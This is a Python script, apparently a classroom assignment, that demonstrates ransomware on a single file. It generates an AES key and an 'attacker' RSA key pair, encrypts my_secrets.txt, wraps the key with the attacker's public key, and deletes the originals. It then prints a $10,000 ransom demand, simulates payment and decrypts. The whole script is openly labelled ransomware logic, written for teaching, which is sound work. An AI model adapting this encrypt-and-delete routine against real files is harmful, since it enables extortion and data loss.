from datetime import datetime
import subprocess
from pathlib import Path
import base64
import os

# Define variables
author = "JON TAN"
current_date = datetime.now().strftime("%d/%m/%Y")

# Display the output
print(f"Author: {author}")
print(f"Current Date: {current_date}")

# Generates a 16-byte key for symmetric encryption
def generate_key():
    key_file = Path("key.txt")

    key = subprocess.run(
        ["openssl", "rand", "-base64", "16"],
        check = True,
        capture_output = True,
        text = True
    )

    # Write the output into a file
    key_file.write_text(key.stdout, encoding ="utf-8")

    # Saved the output into key.txt
    print("[*] 16-byte key generated")
    print("[*] Saved key to key.txt")
    print(f"[*] 16-byte key value: ")
    print("-----BEGIN 16-BYTE KEY-----")
    print(key.stdout.strip())
    print("-----END 16-BYTE KEY-----\n")

# Generating a private key (for attacker)
def generate_private_key():
    output_file = "attacker_private.pem"

    subprocess.run(
        ["openssl", "genpkey", "-algorithm", "RSA", "-pkeyopt", "rsa_keygen_bits:1024", "-out", output_file],
        check = True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL # DEVNULL to suppress the trails, cleaner output
    )

    try:
        with open(output_file, "r", encoding="utf-8") as skey_file:
            skey = skey_file.read()
    except FileNotFoundError:
        print(f"File '{skey}' not found.")
    except Exception as e:
        print(f"An error occurred: {e}")

    print("[*] Private key generated")
    print("[*] Private key saved to attacker_private.pem")
    print(f"[*] Private key value: \n{skey}")

    return output_file

# Generating a public key using private key (for attacker)
def generate_public_key():
    private_key = "attacker_private.pem"
    output_file = "attacker_public.pem"

    subprocess.run(
        ["openssl", "pkey", "-in", private_key, "-pubout", "-out", output_file],
        check = True
    )

    try:
        with open(output_file, "r", encoding="utf-8") as skey_file:
            pkey = skey_file.read()
    except FileNotFoundError:
        print(f"File '{pkey}' not found.")
    except Exception as e:
        print(f"An error occurred: {e}")

    print("[*] Public key generated")
    print("[*] Public key saved to attacker_public.pem")
    print(f"[*] Public key value: \n{pkey}")

    return output_file

def encrypt_secrets_file():
    secret_txt = "my_secrets.txt"
    output_file = "data_cipher.txt"
    key_txt = "key.txt"

    with open(key_txt, "r", encoding="utf-8") as key_file:
        b64 = key_file.read()

    # Converts base64 key to hex
    raw = base64.b64decode(b64)
    hex_str = raw.hex()

    subprocess.run(
        ["openssl", "enc", "-aes-128-ecb", "-base64", "-in", secret_txt, "-K", hex_str, "-out", output_file],
        check = True
    )

    try:
        with open(output_file, "r", encoding="utf-8") as encrypted_file:
            data_cipher = encrypted_file.read()
    except FileNotFoundError:
        print(f"File '{data_cipher}' not found.")
    except Exception as e:
        print(f"An error occurred: {e}")

    print("[!] my_secrets.txt has been encrypted --> data_cipher.txt")
    print(f"[*] data_cipher.txt value: ")
    print("-----BEGIN DATA_CIPHER.TXT-----")
    print(data_cipher.strip())
    print("-----END DATA_CIPHER.TXT-----\n")

    return output_file

def encrypt_key_txt():
    key_txt = "key.txt"
    key_bin_cipher = "key_bin_cipher.bin"
    key_cipher = "key_cipher.txt"
    subprocess.run(
        ["openssl", "pkeyutl", "-encrypt", "-pubin", "-inkey", "attacker_public.pem", "-in", key_txt, "-out", key_bin_cipher]
    )

    # No -a option for asymmetric encryption
    subprocess.run(
        ["openssl", "base64", "-in", key_bin_cipher, "-out", key_cipher]
    )

    # removing the binary file cause assignment wants base64 .txt instead
    os.remove("key_bin_cipher.bin")

    try:
        with open(key_cipher, "r", encoding="utf-8") as encrypted_file:
            key_cipher_txt = encrypted_file.read()
    except FileNotFoundError:
        print(f"File '{key_cipher_txt}' not found.")
    except Exception as e:
        print(f"An error occurred: {e}")

    print("[!] key.txt has been encrypted --> key_cipher.txt")
    print(f"[*] key_cipher.txt value: ")
    print("-----BEGIN KEY_CIPHER.TXT-----")
    print(key_cipher_txt.strip())
    print("-----END KEY_CIPHER.TXT-----\n")

    return key_cipher

def delete_files():
    print("[!] Deleting key.txt...")
    os.remove("key.txt")
    print("[*] Successfully deleted key.txt")
    print("[!] Deleting my_secrets.txt...")
    os.remove("my_secrets.txt")
    print("[*] Successfully deleted my_secrets.txt\n")
    print("[*] Listing contents of directory")
    subprocess.run("ls", shell=True)

def decrypt_key_txt():
    key_decrypt = "key.txt"

    # Decodes the base64 cipher text back into the original cipher binary
    subprocess.run(
        ["openssl", "enc", "-d", "-base64", "-in", "key_cipher.txt", "-out", "key_cipher.bin"],
        check=True
    )
    subprocess.run(
        ["openssl", "pkeyutl", "-decrypt", "-inkey", "attacker_private.pem", "-in", "key_cipher.bin", "-out", key_decrypt],
        check=True
    )

    os.remove("key_cipher.bin")

    return key_decrypt

def decrypt_secret_txt():
    secret_txt = "my_secrets.txt"
    input_cipher_file = "data_cipher.txt"
    key_txt = "key.txt"

    with open(key_txt, "r", encoding="utf-8") as key_file:
        b64 = key_file.read()

    # Converts base64 key to hex
    raw = base64.b64decode(b64)
    hex_str = raw.hex()

    subprocess.run(
        ["openssl", "enc", "-d", "-aes-128-ecb", "-base64", "-in", input_cipher_file, "-K", hex_str, "-out",
         secret_txt],
        check=True
    )

    try:
        with open(secret_txt, "r", encoding="utf-8") as decrypted_file:
            secrets = decrypted_file.read()
    except FileNotFoundError:
        print(f"File '{secrets}' not found.")
    except Exception as e:
        print(f"An error occurred: {e}")

    print("[*] my_secrets.txt file has been decrypted")
    print(f"[*] my_secrets.txt value: ")
    print("-----BEGIN MY_SECRETS.TXT-----")
    print(secrets.strip())
    print("-----END MY_SECRETS.TXT-----\n")
    print("[*] Listing contents of directory")
    subprocess.run("ls", shell=True)
    return secret_txt


def main():
    print("=========================================")
    print("***      Ransomware has started...    ***")
    print("=========================================")
    print("[+] Generating 16-byte key...")
    generate_key()
    print("[+] Generating private key...")
    generate_private_key()
    print("[+] Generating public key...")
    generate_public_key()
    print("[+] Encrypting my_secrets.txt...")
    encrypt_secrets_file()
    print("[+] Encrypting key.txt...")
    encrypt_key_txt()
    print("[+] Deleting key files...")
    delete_files()
    print("\n======================== WARNING!! ========================")
    print("Your file my_secrets.txt is encrypted.\nTo decrypt it, you need to pay me $10,000\nand send key_cipher.txt to me.")
    print("======================== WARNING!! ========================\n")
    print("[+] Sending over $10,000...")
    print("[+] Sending over key_ciper.txt...")
    print("[*] $10,000 & key_cipher.txt received.\n")
    print("[+] Decrypting my_secrets.txt...")
    decrypt_key_txt()
    decrypt_secret_txt()


if __name__ == "__main__":
    main()
